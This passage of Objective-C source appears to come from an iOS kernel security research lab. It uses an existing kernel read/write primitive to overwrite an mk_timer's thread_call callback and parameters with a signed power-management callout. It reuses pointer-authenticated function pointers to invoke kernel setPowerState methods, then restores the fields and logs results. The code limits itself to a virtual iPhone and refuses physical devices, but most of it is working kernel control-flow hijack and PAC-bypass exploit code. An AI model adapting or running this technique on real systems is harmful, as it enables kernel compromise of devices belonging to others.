            report[@"message"] = @"The idle timer and PM fields did not read back exactly before arming.";
            break;
        }

        uint64_t armDeadline = CNDLabThreadCallDeadlineAfterNanoseconds(
            crossClassDispatch
                ? CNDThreadCallCrossClassDispatchDelayNanoseconds
                : CNDThreadCallDispatchDelayNanoseconds);
        uint64_t pollDeadline = CNDLabThreadCallDeadlineAfterNanoseconds(
            CNDThreadCallDispatchTimeoutNanoseconds);
        if (armDeadline == 0 || pollDeadline == 0) {
            report[@"result"] = @"timer-deadline-conversion-failed";
            break;
        }
        report[@"armAttempted"] = @YES;
        kern_return_t armKR = mk_timer_arm(timerPort, armDeadline);
        report[@"armKR"] = @(armKR);
        if (armKR != KERN_SUCCESS) {
            report[@"result"] = @"timer-arm-failed";
            break;
        }
        report[@"armedTimer"] = @YES;
        timerMayBeArmed = YES;

        BOOL queueObserved = NO;
        BOOL queueDrained = NO;
        BOOL pmCompletionObserved = NO;
        BOOL transplantedFieldsStable = YES;
        BOOL operationTranslationObserved = NO;
        uint32_t pollCount = 0;
        uint64_t observedQueue = 0;
        uint16_t observedPMFlags = stagedFlags;
        uint64_t observedResult = resultValue;
        uint64_t observedControllingDriver = crossClassDispatch
            ? selectedDriver : rawControllingDriver;
        uint64_t operationNode = 0;
        uint64_t operationThread = 0;
        uint64_t operationDriver = 0;
        uint64_t operationRawTarget = 0;
        uint64_t operationTarget = 0;
        uint64_t operationListHead =
            pwrMgt + CNDPMOperationListHeadOffset;
        uint64_t operationListTailAddress =
            pwrMgt + CNDPMOperationListTailOffset;
        while (mach_absolute_time() < pollDeadline) {
            uint8_t observation[CNDMkTimerObservedSize] = {0};
            uint64_t observedCount = 0;
            uint64_t observedReason = 0;
            pollCount++;
            BOOL read = cnd_lab_krw_read(
                    timerObject, observation, sizeof(observation)) &&
                cnd_lab_krw_read(
                    pmFlagsAddress, &observedPMFlags,
                    sizeof(observedPMFlags)) &&
                cnd_lab_krw_read(
                    pmCountSlotsAddress, &observedCount,
                    sizeof(observedCount)) &&
                cnd_lab_krw_read(
                    pmReasonAddress, &observedReason,
                    sizeof(observedReason)) &&
                cnd_lab_krw_read(
                    pmResultAddress, &observedResult,
                    sizeof(observedResult)) &&
                (!crossClassDispatch || cnd_lab_krw_read(
                    controllingDriverAddress,
                    &observedControllingDriver,
                    sizeof(observedControllingDriver)));
            if (!read) {
                usleep(CNDThreadCallDispatchPollMicroseconds);
                continue;
            }
            if (!operationTranslationObserved) {
                uint64_t candidate = 0;
                uint64_t confirmed = 0;
                uint8_t operation[CNDPMOperationObservedSize] = {0};
                BOOL candidateRead = cnd_lab_krw_read(
                        operationListTailAddress,
                        &candidate, sizeof(candidate)) &&
                    candidate != 0 && candidate != operationListHead &&
                    CNDLabThreadCallKernelAddress(candidate) &&
                    (candidate & 7) == 0 &&
                    cnd_lab_krw_read(
                        candidate, operation, sizeof(operation)) &&
                    cnd_lab_krw_read(
                        operationListTailAddress,
                        &confirmed, sizeof(confirmed)) &&
                    confirmed == candidate;
                if (candidateRead) {
                    uint64_t candidateThread = CNDLabThreadCallRead64(
                        operation, (size_t)CNDPMOperationThreadOffset);
                    uint64_t candidateDriver = CNDLabThreadCallRead64(
                        operation, (size_t)CNDPMOperationDriverOffset);
                    uint64_t candidateRawTarget = CNDLabThreadCallRead64(
                        operation, (size_t)CNDPMOperationTargetOffset);
                    uint64_t candidateTarget =
                        CNDLabThreadCallStripInstructionPAC(
                            candidateRawTarget);
                    if (CNDLabThreadCallKernelAddress(candidateThread) &&
                        candidateDriver == selectedDriver &&
                        candidateRawTarget != candidateTarget &&
                        candidateTarget == expectedSelectedMethod) {
                        operationTranslationObserved = YES;
                        operationNode = candidate;
                        operationThread = candidateThread;
                        operationDriver = candidateDriver;
                        operationRawTarget = candidateRawTarget;
                        operationTarget = candidateTarget;
                    }
                }
            }
            observedQueue = CNDLabThreadCallRead64(
                observation, (size_t)CNDMkTimerTCQueueOffset);
            if (observedQueue != 0) queueObserved = YES;
            transplantedFieldsStable =
                CNDLabThreadCallRead64(
                    observation, (size_t)CNDMkTimerCallbackOffset) ==
                        signedPMCallback &&
                CNDLabThreadCallRead64(
                    observation, (size_t)CNDMkTimerParam0Offset) == root &&
                CNDLabThreadCallRead64(
                    observation, (size_t)CNDMkTimerParam1Offset) == 0 &&
                observedCount == stagedCountSlots &&
                observedReason == stagedReason &&
                (!crossClassDispatch ||
                 observedControllingDriver == selectedDriver);
            queueDrained = queueObserved && observedQueue == 0;
            pmCompletionObserved = queueDrained &&
                (observedPMFlags & CNDPMDriverCallBusyMask) == 0;
            if (!transplantedFieldsStable || pmCompletionObserved) break;
            usleep(CNDThreadCallDispatchPollMicroseconds);
        }
        report[@"dispatchPollCount"] = @(pollCount);
        report[@"queueObserved"] = @(queueObserved);
        report[@"queueDrained"] = @(queueDrained);
        report[@"pmCompletionObserved"] = @(pmCompletionObserved);
        report[@"transplantedFieldsStable"] = @(
            transplantedFieldsStable);
        report[@"observedPMFlags"] = [NSString stringWithFormat:
            @"0x%04x", observedPMFlags];
        report[@"observedPMResult"] = CNDLabThreadCallHex(
            observedResult);
        report[@"observedControllingDriver"] =
            CNDLabThreadCallHex(observedControllingDriver);
        report[@"operationListHead"] = CNDLabThreadCallHex(
            operationListHead);
        report[@"operationListTailAddress"] = CNDLabThreadCallHex(
            operationListTailAddress);
        report[@"operationTranslationObserved"] = @(
            operationTranslationObserved);
        report[@"operationNode"] = CNDLabThreadCallHex(operationNode);
        report[@"operationThread"] = CNDLabThreadCallHex(operationThread);
        report[@"operationDriver"] = CNDLabThreadCallHex(operationDriver);
        report[@"operationRawIAZeroTarget"] = CNDLabThreadCallHex(
            operationRawTarget);
        report[@"operationIAZeroTarget"] = CNDLabThreadCallHex(
            operationTarget);
        report[@"operationTargetMatchesSelectedMethod"] = @(
            operationTranslationObserved &&
            operationTarget == expectedSelectedMethod);
        report[@"callbackDispatched"] = @(queueDrained);
        report[@"callbackCompleted"] = @(pmCompletionObserved);
        if (!pmCompletionObserved || !transplantedFieldsStable) {
            report[@"result"] = @"pm-callout-dispatch-observation-failed";
            report[@"message"] = @"The PM callback did not drain and clear its exact busy bit with stable fields.";
            break;
        }

        BOOL controllingDriverRestored = YES;
        if (crossClassDispatch) {
            BOOL controllingDriverRestore = cnd_lab_krw_write(
                controllingDriverAddress,
                &originalRawControllingDriver,
                sizeof(originalRawControllingDriver));
            uint64_t restoredControllingDriver = 0;
            controllingDriverRestored = controllingDriverRestore &&
                cnd_lab_krw_read(
                    controllingDriverAddress,
                    &restoredControllingDriver,
                    sizeof(restoredControllingDriver)) &&
                restoredControllingDriver == originalRawControllingDriver;
            controllingDriverOutstanding = !controllingDriverRestored;
            report[@"controllingDriverRestored"] = @(
                controllingDriverRestored);
            report[@"controllingDriverRestoreReadback"] =
                CNDLabThreadCallHex(restoredControllingDriver);
        }

        BOOL powerStateRestored = YES;
        if (m68Dispatch) {
            BOOL powerStateRestore = cnd_lab_krw_write(
                powerStateAddress, &originalPowerState,
                sizeof(originalPowerState));
            uint64_t restoredPowerState = UINT64_MAX;
            powerStateRestored = powerStateRestore && cnd_lab_krw_read(
                    powerStateAddress, &restoredPowerState,
                    sizeof(restoredPowerState)) &&
                restoredPowerState == originalPowerState;
            powerStateOutstanding = !powerStateRestored;
            report[@"powerStateRestored"] = @(powerStateRestored);
            report[@"powerStateRestoreReadback"] =
                CNDLabThreadCallHex(restoredPowerState);
        }

        BOOL resultRestore = cnd_lab_krw_write(
            pmResultAddress, &originalPMResult, sizeof(originalPMResult));
        BOOL reasonRestore = resultRestore && cnd_lab_krw_write(
            pmReasonAddress, &originalPMReason, sizeof(originalPMReason));
        BOOL countRestore = reasonRestore && cnd_lab_krw_write(
            pmCountSlotsAddress, &originalPMCountSlots,
            sizeof(originalPMCountSlots));
        BOOL flagsRestore = countRestore && cnd_lab_krw_write(
            pmFlagsAddress, &originalPMFlags, sizeof(originalPMFlags));
        uint64_t restoredResult = UINT64_MAX;
        uint64_t restoredReason = UINT64_MAX;
        uint64_t restoredCount = UINT64_MAX;
        uint16_t restoredFlags = UINT16_MAX;
        BOOL pmRestoreRead = flagsRestore && cnd_lab_krw_read(
                pmResultAddress, &restoredResult, sizeof(restoredResult)) &&
            cnd_lab_krw_read(
                pmReasonAddress, &restoredReason,
                sizeof(restoredReason)) &&
            cnd_lab_krw_read(
                pmCountSlotsAddress, &restoredCount,
                sizeof(restoredCount)) &&
            cnd_lab_krw_read(
                pmFlagsAddress, &restoredFlags, sizeof(restoredFlags));
        BOOL pmRestored = pmRestoreRead &&
            restoredResult == originalPMResult &&
            restoredReason == originalPMReason &&
            restoredCount == originalPMCountSlots &&
            restoredFlags == originalPMFlags;
        pmStateOutstanding = !pmRestored;
        report[@"pmStateRestored"] = @(pmRestored);

        BOOL timerParam1Restore = cnd_lab_krw_write(
            timerParam1Address, &originalTimerParam1,
            sizeof(originalTimerParam1));
        BOOL timerCallbackRestore = timerParam1Restore &&
            cnd_lab_krw_write(
                timerCallbackAddress, &originalTimerCallback,
                sizeof(originalTimerCallback));
        BOOL timerParam0Restore = timerCallbackRestore &&
            cnd_lab_krw_write(
                timerParam0Address, &originalTimerParam0,
                sizeof(originalTimerParam0));
        uint64_t restoredTimerCallback = 0;
        uint64_t restoredTimerParam0 = 0;
        uint64_t restoredTimerParam1 = UINT64_MAX;
        BOOL timerRestoreRead = timerParam0Restore && cnd_lab_krw_read(
                timerCallbackAddress, &restoredTimerCallback,
                sizeof(restoredTimerCallback)) &&
            cnd_lab_krw_read(
                timerParam0Address, &restoredTimerParam0,
                sizeof(restoredTimerParam0)) &&
            cnd_lab_krw_read(
                timerParam1Address, &restoredTimerParam1,
                sizeof(restoredTimerParam1));
        BOOL timerRestored = timerRestoreRead &&
            restoredTimerCallback == originalTimerCallback &&
            restoredTimerParam0 == originalTimerParam0 &&
            restoredTimerParam1 == originalTimerParam1;
        timerFieldsOutstanding = !timerRestored;
        report[@"timerFieldsRestored"] = @(timerRestored);
        if (!controllingDriverRestored || !powerStateRestored ||
            !pmRestored || !timerRestored) {
            report[@"result"] = @"pm-callout-field-restore-failed";
            break;
        }

        uint64_t cancelledDeadline = 0;
        kern_return_t cancelKR = mk_timer_cancel(
            timerPort, &cancelledDeadline);
        report[@"cancelKR"] = @(cancelKR);
        uint8_t cancelled[CNDMkTimerObservedSize] = {0};
        BOOL cancelledRead = cnd_lab_krw_read(
            timerObject, cancelled, sizeof(cancelled));
        uint64_t cancelledQueue = cancelledRead
            ? CNDLabThreadCallRead64(
                cancelled, (size_t)CNDMkTimerTCQueueOffset) : UINT64_MAX;
        uint8_t cancelledIsArmed = cancelledRead
            ? cancelled[CNDMkTimerIsArmedOffset] : UINT8_MAX;
        uint32_t cancelledActive = cancelledRead
            ? CNDLabThreadCallRead32(
                cancelled, (size_t)CNDMkTimerActiveOffset) : UINT32_MAX;
        BOOL ownerReadyForRepair = cancelKR == KERN_SUCCESS &&
            cancelledRead && cancelledQueue == 0 &&
            cancelledIsArmed == 0 && cancelledActive == 1;
        uint32_t repairedActive = 0;
        BOOL activeRepair = ownerReadyForRepair && cnd_lab_krw_write(
            timerObject + CNDMkTimerActiveOffset,
            &repairedActive, sizeof(repairedActive));
        uint32_t activeReadback = UINT32_MAX;
        BOOL activeRepairVerified = activeRepair && cnd_lab_krw_read(
            timerObject + CNDMkTimerActiveOffset,
            &activeReadback, sizeof(activeReadback)) &&
            activeReadback == 0;
        report[@"ownerReadyForRepair"] = @(ownerReadyForRepair);
        report[@"ownerStateRepaired"] = @(activeRepairVerified);
        if (!activeRepairVerified) {
            report[@"result"] = @"pm-callout-owner-state-repair-failed";
            break;
        }
        timerMayBeArmed = NO;
        report[@"exactPMCalloutDispatch"] = @YES;
        report[@"exactPMCrossClassDispatch"] = @(crossClassDispatch);
        report[@"exactPMM68Dispatch"] = @(m68Dispatch);
        report[@"result"] = m68Dispatch
            ? @"exact-autonomous-pm-apple-m68-buttons-dispatch-observed"
            : crossClassDispatch
                ? @"exact-autonomous-pm-iouserserver-dispatch-observed"
                : @"exact-autonomous-pm-callout-dispatch-observed";
        report[@"message"] = m68Dispatch
            ? @"The signed root-domain pmDriverCallout selected the live AppleM68Buttons authenticated setPowerState entry, completed the requested PM call, and restored the controlling driver plus every timer and PM field without provider kcall."
            : crossClassDispatch
                ? @"The signed root-domain pmDriverCallout selected a live IOUserServer's authenticated setPowerState entry, completed the same-state call, and restored the controlling driver plus every timer and PM field without provider kcall."
                : @"The signed root-domain pmDriverCallout callback ran from the sacrificial timer, completed one same-state selector-1 call, cleared its busy bit, and restored every staged field without provider kcall.";
      } while (0);
    } @finally {
        BOOL callbackQuiesced = YES;
        if (timerMayBeArmed) {
            report[@"emergencyCancelAttempted"] = @YES;
            uint64_t cancelledDeadline = 0;
            kern_return_t cancelKR = mk_timer_cancel(
                timerPort, &cancelledDeadline);
            report[@"emergencyCancelKR"] = @(cancelKR);
            uint64_t quiesceDeadline =
                CNDLabThreadCallDeadlineAfterNanoseconds(
                    CNDThreadCallDispatchTimeoutNanoseconds);
            callbackQuiesced = NO;
            do {
                uint8_t state[CNDMkTimerObservedSize] = {0};
                uint16_t livePMFlags = 0;
                BOOL stateRead = cnd_lab_krw_read(
                    timerObject, state, sizeof(state));
                BOOL flagsRead = !pmFlagsAddress || cnd_lab_krw_read(
                    pmFlagsAddress, &livePMFlags, sizeof(livePMFlags));
                if (stateRead && flagsRead) {
                    uint64_t queue = CNDLabThreadCallRead64(
                        state, (size_t)CNDMkTimerTCQueueOffset);
                    uint16_t callFlags = CNDLabThreadCallRead16(
                        state, (size_t)CNDMkTimerFlagsOffset);
                    callbackQuiesced = queue == 0 &&
                        (callFlags & CNDThreadCallBusyMask) == 0 &&
                        (!pmFlagsAddress ||
                         (livePMFlags & CNDPMDriverCallBusyMask) == 0);
                    if (callbackQuiesced) break;
                }
                usleep(CNDThreadCallDispatchPollMicroseconds);
            } while (quiesceDeadline &&
                mach_absolute_time() < quiesceDeadline);
            if (callbackQuiesced) timerMayBeArmed = NO;
            report[@"callbackQuiescedBeforeEmergencyRestore"] = @(
                callbackQuiesced);
        }

        if (controllingDriverOutstanding && callbackQuiesced) {
            report[@"controllingDriverEmergencyRestoreAttempted"] = @YES;
            BOOL restored = cnd_lab_krw_write(
                controllingDriverAddress,
                &originalRawControllingDriver,
                sizeof(originalRawControllingDriver));
            uint64_t readback = 0;
            restored = restored && cnd_lab_krw_read(
                    controllingDriverAddress, &readback,
                    sizeof(readback)) &&
                readback == originalRawControllingDriver;
            controllingDriverOutstanding = !restored;
            report[@"controllingDriverEmergencyRestoreVerified"] = @(
                restored);
        }

        if (powerStateOutstanding && callbackQuiesced) {
            report[@"powerStateEmergencyRestoreAttempted"] = @YES;
            BOOL restored = cnd_lab_krw_write(
                powerStateAddress, &originalPowerState,
                sizeof(originalPowerState));
            uint64_t readback = UINT64_MAX;
            restored = restored && cnd_lab_krw_read(
                    powerStateAddress, &readback, sizeof(readback)) &&
                readback == originalPowerState;
            powerStateOutstanding = !restored;
            report[@"powerStateEmergencyRestoreVerified"] = @(restored);
        }

        if (pmStateOutstanding && callbackQuiesced) {
            report[@"pmEmergencyRestoreAttempted"] = @YES;
            BOOL restored = cnd_lab_krw_write(
                    pmResultAddress, &originalPMResult,
                    sizeof(originalPMResult)) &&
                cnd_lab_krw_write(
                    pmReasonAddress, &originalPMReason,
                    sizeof(originalPMReason)) &&
                cnd_lab_krw_write(
                    pmCountSlotsAddress, &originalPMCountSlots,
                    sizeof(originalPMCountSlots)) &&
                cnd_lab_krw_write(
                    pmFlagsAddress, &originalPMFlags,
                    sizeof(originalPMFlags));
            uint64_t resultReadback = UINT64_MAX;
            uint64_t reasonReadback = UINT64_MAX;
            uint64_t countReadback = UINT64_MAX;
            uint16_t flagsReadback = UINT16_MAX;
            restored = restored && cnd_lab_krw_read(
                    pmResultAddress, &resultReadback,
                    sizeof(resultReadback)) &&
                cnd_lab_krw_read(
                    pmReasonAddress, &reasonReadback,
                    sizeof(reasonReadback)) &&
                cnd_lab_krw_read(
                    pmCountSlotsAddress, &countReadback,
                    sizeof(countReadback)) &&
                cnd_lab_krw_read(
                    pmFlagsAddress, &flagsReadback,
                    sizeof(flagsReadback)) &&
                resultReadback == originalPMResult &&
                reasonReadback == originalPMReason &&
                countReadback == originalPMCountSlots &&
                flagsReadback == originalPMFlags;
            pmStateOutstanding = !restored;
            report[@"pmEmergencyRestoreVerified"] = @(restored);
        }

        if (timerFieldsOutstanding && callbackQuiesced) {
            report[@"timerEmergencyRestoreAttempted"] = @YES;
            BOOL restored = cnd_lab_krw_write(
                    timerParam1Address, &originalTimerParam1,
                    sizeof(originalTimerParam1)) &&
                cnd_lab_krw_write(
                    timerCallbackAddress, &originalTimerCallback,
                    sizeof(originalTimerCallback)) &&
                cnd_lab_krw_write(
                    timerParam0Address, &originalTimerParam0,
                    sizeof(originalTimerParam0));
            uint64_t callbackReadback = 0;
            uint64_t param0Readback = 0;
            uint64_t param1Readback = UINT64_MAX;
            restored = restored && cnd_lab_krw_read(
                    timerCallbackAddress, &callbackReadback,
                    sizeof(callbackReadback)) &&
                cnd_lab_krw_read(
                    timerParam0Address, &param0Readback,
                    sizeof(param0Readback)) &&
                cnd_lab_krw_read(
                    timerParam1Address, &param1Readback,
                    sizeof(param1Readback)) &&
                callbackReadback == originalTimerCallback &&
                param0Readback == originalTimerParam0 &&
                param1Readback == originalTimerParam1;
            timerFieldsOutstanding = !restored;
            report[@"timerEmergencyRestoreVerified"] = @(restored);
        }

        BOOL ownerSafe = timerObject == 0;
        if (timerObject != 0 && callbackQuiesced) {
            uint8_t owner[CNDMkTimerObservedSize] = {0};
            BOOL ownerRead = cnd_lab_krw_read(
                timerObject, owner, sizeof(owner));
            uint64_t queue = ownerRead ? CNDLabThreadCallRead64(
                owner, (size_t)CNDMkTimerTCQueueOffset) : UINT64_MAX;
            uint8_t isArmed = ownerRead
                ? owner[CNDMkTimerIsArmedOffset] : UINT8_MAX;
            uint32_t active = ownerRead ? CNDLabThreadCallRead32(
                owner, (size_t)CNDMkTimerActiveOffset) : UINT32_MAX;
            ownerSafe = ownerRead && queue == 0 && isArmed == 0 && active == 0;
            if (!ownerSafe && ownerRead && queue == 0 &&
                isArmed == 0 && active == 1) {
                uint32_t repaired = 0;
                BOOL repairWrite = cnd_lab_krw_write(
                    timerObject + CNDMkTimerActiveOffset,
                    &repaired, sizeof(repaired));
                uint32_t readback = UINT32_MAX;
                ownerSafe = repairWrite && cnd_lab_krw_read(
                    timerObject + CNDMkTimerActiveOffset,
                    &readback, sizeof(readback)) && readback == 0;
                report[@"emergencyOwnerRepairVerified"] = @(ownerSafe);
            }
        }

        BOOL safeToDestroy = callbackQuiesced && ownerSafe &&
            !timerMayBeArmed && !timerFieldsOutstanding &&
            !pmStateOutstanding && !controllingDriverOutstanding &&
            !powerStateOutstanding;
        report[@"restoreVerifiedBeforeDestroy"] = @(
            !timerFieldsOutstanding && !pmStateOutstanding &&
            !controllingDriverOutstanding && !powerStateOutstanding);
        report[@"timerQuiescedBeforeDestroy"] = @(callbackQuiesced);
        report[@"ownerSafeBeforeDestroy"] = @(ownerSafe);
        kern_return_t destroyKR = safeToDestroy
            ? mk_timer_destroy(timerPort) : KERN_FAILURE;
        report[@"timerDestroySkipped"] = @(!safeToDestroy);
        report[@"destroyKR"] = @(destroyKR);
        report[@"timerDestroyed"] = @(destroyKR == KERN_SUCCESS);
        if (destroyKR != KERN_SUCCESS) {
            report[@"exactPMCalloutDispatch"] = @NO;
            report[@"result"] = safeToDestroy
                ? @"timer-destroy-failed"
                : @"timer-destroy-refused-unsafe-state";
            report[@"message"] = @"Fail-closed cleanup did not prove a restored, quiesced, destroyable PM-callout timer.";
        }
        if (MACH_PORT_VALID(retainedTargetService)) {
            mach_port_deallocate(mach_task_self(), retainedTargetService);
            retainedTargetService = MACH_PORT_NULL;
        }
    }

    report[@"completedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *path = [directory stringByAppendingPathComponent:
        m68Dispatch
            ? @"CNDLabPMM68Dispatch.json"
            : crossClassDispatch
                ? @"CNDLabPMCrossClassDispatch.json"
                : @"CNDLabPMCalloutHarvest.json"];
    report[@"reportPath"] = path;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:nil];
    report[@"reportSaved"] = @(data && [data writeToFile:path
        options:NSDataWritingAtomic error:nil]);
    return [report copy];
}

BOOL CNDLabThreadCallPACBoundaryIsSupported(NSString **reasonOut)
{
    CNDLabPACProfile profile = {0};
    BOOL guest = cnd_lab_vphone_guest();
    BOOL krw = guest && cnd_lab_krw_ready() &&
        cnd_lab_kernel_rw_active();
    BOOL exact = krw && cnd_lab_pac_identity_profile(&profile);
    if (reasonOut) {
        if (!guest) {
            *reasonOut = @"vPhone-only diagnostic; physical devices are refused.";
        } else if (!krw) {
            *reasonOut = @"The VM's validated read/write provider is not active.";
        } else if (!exact) {
            *reasonOut = @"The live VM kernel did not match the exact REA profile.";
        } else {
            *reasonOut = @"Exact iOS 26.0 / 23A341 vPhone kernel matched.";
        }
    }
    return exact;
}

BOOL CNDLabThreadCallPACBoundaryIsRunning(void)
{
    return __sync_fetch_and_add(
        &gCNDLabThreadCallPACBoundaryRunning, 0) != 0;
}

void CNDLabThreadCallPACBoundaryRun(
    CNDLabThreadCallPACBoundaryCompletion completion)
{
    CNDLabThreadCallPACBoundaryRunMode(
        CNDLabThreadCallPACBoundaryModeReadOnly, completion);
}

static void CNDLabThreadCallPACBoundaryRunMode(
    CNDLabThreadCallPACBoundaryMode mode,
    CNDLabThreadCallPACBoundaryCompletion completion)
{
    if (!completion) return;
    NSString *supportReason = nil;
    if (!CNDLabThreadCallPACBoundaryIsSupported(&supportReason)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-unsupported-environment",
                @"message": supportReason ?: @"Unsupported environment.",
            });
        });
        return;
    }
    if (!__sync_bool_compare_and_swap(
            &gCNDLabThreadCallPACBoundaryRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message": @"The VM thread_call PAC boundary probe is already running.",
            });
        });
        return;
    }

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report =
            CNDLabThreadCallPACBoundaryRunOnce(mode);
        __sync_lock_release(&gCNDLabThreadCallPACBoundaryRunning);
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}

void CNDLabThreadCallPACBoundaryRunReversibleMutation(
    CNDLabThreadCallPACBoundaryCompletion completion)
{
    CNDLabThreadCallPACBoundaryRunMode(
        CNDLabThreadCallPACBoundaryModeReversibleMutation, completion);
}

void CNDLabThreadCallPACBoundaryRunOriginalCallbackDispatch(
    CNDLabThreadCallPACBoundaryCompletion completion)
{
    CNDLabThreadCallPACBoundaryRunMode(
        CNDLabThreadCallPACBoundaryModeOriginalCallbackDispatch,
        completion);
}

void CNDLabThreadCallPACBoundaryRunPACReuseDispatch(
    CNDLabThreadCallPACBoundaryCompletion completion)
{
    CNDLabThreadCallPACBoundaryRunMode(
        CNDLabThreadCallPACBoundaryModePACReuseDispatch,
        completion);
}

static void CNDLabThreadCallPACBoundaryRunPMTargetMode(
    CNDLabPMCalloutTargetMode targetMode,
    CNDLabThreadCallPACBoundaryCompletion completion)
{
    if (!completion) return;
    NSString *supportReason = nil;
    if (!CNDLabThreadCallPACBoundaryIsSupported(&supportReason)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-unsupported-environment",
                @"message": supportReason ?: @"Unsupported environment.",
            });
        });
        return;
    }
    if (!__sync_bool_compare_and_swap(
            &gCNDLabThreadCallPACBoundaryRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message": @"The VM thread_call PAC boundary probe is already running.",
            });
        });
        return;
    }

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report =
            CNDLabThreadCallPMCalloutHarvestRunOnce(targetMode);
        __sync_lock_release(&gCNDLabThreadCallPACBoundaryRunning);
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}

void CNDLabThreadCallPACBoundaryRunPMCalloutHarvest(
    CNDLabThreadCallPACBoundaryCompletion completion)
{
    CNDLabThreadCallPACBoundaryRunPMTargetMode(
        CNDLabPMCalloutTargetModeRootDomain, completion);
}

void CNDLabThreadCallPACBoundaryRunPMCrossClassDispatch(
    CNDLabThreadCallPACBoundaryCompletion completion)
{
    CNDLabThreadCallPACBoundaryRunPMTargetMode(
        CNDLabPMCalloutTargetModeIOUserServer, completion);
}

void CNDLabThreadCallPACBoundaryRunPMM68Dispatch(
    CNDLabThreadCallPACBoundaryCompletion completion)
{
    CNDLabThreadCallPACBoundaryRunPMTargetMode(
        CNDLabPMCalloutTargetModeAppleM68Buttons, completion);
}
